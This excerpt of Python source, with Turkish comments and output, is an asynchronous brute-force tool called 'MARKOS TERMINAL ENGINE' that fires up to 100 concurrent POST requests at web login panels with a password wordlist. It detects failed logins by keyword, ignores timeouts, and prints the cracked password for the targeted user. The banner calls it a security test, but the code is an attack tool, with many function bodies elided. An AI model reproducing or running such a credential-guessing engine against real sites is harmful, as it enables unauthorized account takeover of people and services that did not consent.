...
def banner_goster():
  ...
  ██║  ██║███████╗██████╔╝██║  ██║██║  ██║   ██║   
  ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    {Fore.RED}--- [ASENKRON MOTOR] MARKOS TERMINAL ENGINE v{SÜRÜM} ---
    {Fore.YELLOW}[+] Mimari: Asyncio / AioHTTP (Mermi Hızında Şifre Deneme)
    {Fore.CYAN}[+] Hedef  : Web Giriş Panelleri Güvenlik ve Mukavemet Testi
    """)
...
async def tekli_sifre_dene(session, url, user_field, pass_field, username, password):
    ...
    try:
        ...
        # Asenkron HTTP POST isteği (Sunucunun cevabını beklemeden döngü devam eder)
        async with session.post(url, data=data, timeout=3, allow_redirects=True) as response:
            icerik = await response.text()
            
            # Hatalı giriş uyarısı tespiti (Kelime filtreleme)
        ...
        # Sunucu zaman aşımına uğrarsa veya istek düşerse sessizce atla
        pass

async def main_engine(url, user_field, pass_field, username, sifreler):
    global SIFRE_BULUNDU
    
    # Tek bir TCP bağlantı havuzu açıyoruz (Eşzamanlı limit: 100)
    ...
    async with aiohttp.ClientSession(connector=connector) as session:
        ...
        for sifre in sifreler:
            if SIFRE_BULUNDU:
                break
            # Görevleri sıraya alıp ağa fırlatıyoruz
...
def calistir():
    ...
    banner_goster()
    print(f"{Fore.RED}[🚨] MARKOS ASENKRON MOTORU BAŞLATILDI!")
    print(f"{Fore.YELLOW}[*] Toplam {len(sifreler)} şifre asenkron kuyruğa alındı. Test sürüyor...\n")
    ...
    print("\n" + "="*55)
    if SIFRE_BULUNDU:
        print(f"{Fore.GREEN}[+] DOĞRULAMA BAŞARILI! DOĞRU PARAMETRE YAKALANDI.")
        print(f"{Fore.GREEN}[+] HEDEF KULLANICI : {username}")
        print(f"{Fore.GREEN}[+] BULUNAN ŞİFRE   : {BULUNAN_SIFRE}")
    else:
        print(f"{Fore.RED}[-] BAŞARISIZ! Wordlist bitti ancak geçerli şifre yakalanamadı.")
